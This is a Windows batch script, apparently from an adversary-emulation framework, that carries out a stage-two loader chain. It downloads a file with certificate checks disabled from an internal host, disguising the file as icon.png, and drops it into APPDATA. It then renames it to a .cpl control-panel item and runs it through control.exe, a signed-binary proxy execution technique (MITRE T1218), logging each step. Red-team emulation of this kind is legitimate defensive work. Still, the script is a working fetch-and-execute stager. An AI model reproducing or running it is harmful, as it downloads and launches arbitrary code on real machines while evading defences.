@echo off
SETLOCAL EnableDelayedExpansion

REM Placeholder constant declarations (random-named SET variables)
SET _a=%APPDATA%\11213\cacd865f
SET _b=e9184702.txt
SET _c=https://10.0.0.49/stage/2/icon.png?11213-7
SET _d=BALAM-S2B
SET _e=11213
SET _f=7
SET _g=%PUBLIC%\\macula-simulations.log

REM Cache timestamp once
SET tsvar=!DATE!/!TIME!

REM Debug: heartbeat_start
echo [!tsvar!][DEBUG][!_d!][!_e!]: heartbeat_start>> "!_g!" 2>nul

REM Heartbeat fetch – download Stage 2 Loader DLL
curl -k -s -o "!_a!\!_b!" "!_c!"
SET _curl_err=%ERRORLEVEL%

REM Debug: heartbeat_complete
echo [!tsvar!][DEBUG][!_d!][!_e!]: heartbeat_complete>> "!_g!" 2>nul

REM Check if download succeeded
IF NOT EXIST "!_a!\!_b!" (
    echo [!tsvar!][TTP][!_d!][!_e!]: T1218^^|System Binary Proxy Execution=[FAIL]:download_failed>> "!_g!" 2>nul
    EXIT /B 1
)

REM Debug: chdir_start
echo [!tsvar!][DEBUG][!_d!][!_e!]: chdir_start>> "!_g!" 2>nul

REM Change working directory to output dir
cd /d "!_a!" >nul 2>&1
SET _chdir_err=%ERRORLEVEL%

REM Debug: chdir_result
echo [!tsvar!][DEBUG][!_d!][!_e!]: chdir_result=!_chdir_err!>> "!_g!" 2>nul

REM Get base name without extension
FOR %%i IN ("!_b!") DO SET _base_cpl=%%~ni

REM Debug: ren_start
echo [!tsvar!][DEBUG][!_d!][!_e!]: ren_start>> "!_g!" 2>nul

REM Rename to .cpl
ren "!_b!" "!_base_cpl!.cpl"
SET _ren_err=%ERRORLEVEL%

REM Debug: ren_result
echo [!tsvar!][DEBUG][!_d!][!_e!]: ren_result=!_ren_err!>> "!_g!" 2>nul

REM Debug: controlexec_start
echo [!tsvar!][DEBUG][!_d!][!_e!]: controlexec_start>> "!_g!" 2>nul

REM Invoke via control.exe with full absolute path
control.exe "!_a!\!_base_cpl!.cpl"
SET _ctrl_err=%ERRORLEVEL%

REM Debug: controlexec_result
echo [!tsvar!][DEBUG][!_d!][!_e!]: controlexec_result=!_ctrl_err!>> "!_g!" 2>nul

REM TTP log line at completion
IF !_ctrl_err! EQU 0 (
    echo [!tsvar!][TTP][!_d!][!_e!]: T1218^^|System Binary Proxy Execution=[OK]:[]>> "!_g!" 2>nul
) ELSE (
    echo [!tsvar!][TTP][!_d!][!_e!]: T1218^^|System Binary Proxy Execution=[FAIL]:ctrl_err=!_ctrl_err!>> "!_g!" 2>nul
)

REM Terminate
EXIT /B !_ctrl_err!